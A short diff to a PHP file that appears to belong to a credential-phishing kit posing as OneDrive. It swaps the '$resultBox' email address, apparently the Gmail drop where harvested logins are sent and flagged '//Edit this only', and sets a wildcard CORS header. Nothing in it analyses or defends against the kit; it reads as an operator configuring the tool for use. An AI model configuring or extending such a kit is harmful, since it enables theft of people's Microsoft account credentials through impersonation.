@@ -1,6 +1,6 @@
 <?php header('Access-Control-Allow-Origin: *');
 
-	$resultBox = 'donpero@gmail.com';   //Edit this only
+	$resultBox = 'dkraus898@gmail.com';   //Edit this only
 
 	$name = "Onedrive"
 
